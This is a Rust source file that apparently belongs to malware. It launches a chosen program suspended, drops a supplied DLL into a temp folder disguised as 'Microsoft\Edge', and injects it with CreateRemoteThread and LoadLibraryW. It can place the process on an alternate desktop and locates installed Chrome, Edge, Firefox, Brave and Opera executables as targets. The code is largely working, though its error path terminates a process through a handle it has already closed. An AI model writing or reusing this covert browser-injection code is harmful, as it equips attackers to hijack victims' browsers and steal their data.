use std::{ffi::c_void, mem, path::PathBuf};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        LibraryLoader::{GetModuleHandleW, GetProcAddress},
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
        Threading::{
            CreateProcessW, CreateRemoteThread, ResumeThread, WaitForSingleObject,
            CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
        },
    },
};

/// Launches `application` suspended, injects `dll` through `LoadLibraryW`, and
/// resumes the process. Returns the new process id.
pub fn inject(application: &str, arguments: &str, dll: &[u8], desktop: Option<&str>) -> Result<u32, String> {
    if application.trim().is_empty() {
        return Err("missing application path".to_owned());
    }
    let directory = std::env::temp_dir().join("Microsoft").join("Edge");
    std::fs::create_dir_all(&directory).map_err(|error| error.to_string())?;
    let dll_path = directory.join(format!("{}.dll", uuid::Uuid::new_v4().simple()));
    std::fs::write(&dll_path, dll).map_err(|error| error.to_string())?;
    let path_wide = super::wide(&dll_path.to_string_lossy());

    let application_wide = super::wide(application);
    let command_line = if arguments.trim().is_empty() {
        application.to_owned()
    } else {
        format!("{application} {arguments}")
    };
    let mut command_wide: Vec<u16> = command_line.encode_utf16().chain(std::iter::once(0)).collect();

    let mut desktop_wide = desktop.map(super::wide);
    let mut startup: STARTUPINFOW = unsafe { mem::zeroed() };
    startup.cb = mem::size_of::<STARTUPINFOW>() as u32;
    if let Some(value) = desktop_wide.as_mut() {
        startup.lpDesktop = value.as_mut_ptr();
    }
    let mut process: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let created = unsafe {
        CreateProcessW(
            application_wide.as_ptr(),
            command_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &startup,
            &mut process,
        )
    };
    if created == 0 {
        let _ = std::fs::remove_file(&dll_path);
        return Err("CreateProcess failed".to_owned());
    }

    let result = (|| -> Result<u32, String> {
        let size = path_wide.len() * 2;
        let remote = unsafe {
            VirtualAllocEx(
                process.hProcess,
                std::ptr::null(),
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if remote.is_null() {
            return Err("VirtualAllocEx failed".to_owned());
        }
        let mut written = 0usize;
        let ok = unsafe {
            WriteProcessMemory(
                process.hProcess,
                remote,
                path_wide.as_ptr() as *const c_void,
                size,
                &mut written,
            )
        };
        if ok == 0 || written != size {
            return Err("WriteProcessMemory failed".to_owned());
        }

        let kernel = unsafe { GetModuleHandleW(super::wide("kernel32.dll").as_ptr()) };
        if kernel.is_null() {
            return Err("kernel32 not found".to_owned());
        }
        let load_library = unsafe { GetProcAddress(kernel, b"LoadLibraryW\0".as_ptr()) };
        let Some(load_library) = load_library else {
            return Err("LoadLibraryW not found".to_owned());
        };

        let routine: unsafe extern "system" fn(*mut c_void) -> u32 =
            unsafe { std::mem::transmute(load_library) };
        let thread = unsafe {
            CreateRemoteThread(
                process.hProcess,
                std::ptr::null(),
                0,
                Some(routine),
                remote,
                0,
                std::ptr::null_mut(),
            )
        };
        if thread.is_null() {
            return Err("CreateRemoteThread failed".to_owned());
        }
        unsafe {
            WaitForSingleObject(thread, 10_000);
            CloseHandle(thread);
            ResumeThread(process.hThread);
        }
        Ok(process.dwProcessId)
    })();

    unsafe {
        CloseHandle(process.hThread);
        CloseHandle(process.hProcess);
    }
    if result.is_err() {
        unsafe {
            windows_sys::Win32::System::Threading::TerminateProcess(process.hProcess, 1);
        }
        let _ = std::fs::remove_file(&dll_path);
    }
    result
}

/// Resolves the executable for a browser name from the standard install paths.
pub fn browser_path(browser: &str) -> Option<PathBuf> {
    let candidates: &[&str] = match browser.to_ascii_lowercase().as_str() {
        "chrome" | "google chrome" => &[
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
        "edge" | "msedge" => &[
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "firefox" => &[r"C:\Program Files\Mozilla Firefox\firefox.exe"],
        "brave" => &[r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"],
        "opera" => &[r"C:\Program Files\Opera\opera.exe"],
        _ => &[],
    };
    candidates
        .iter()
        .map(PathBuf::from)
        .find(|path| path.exists())
}
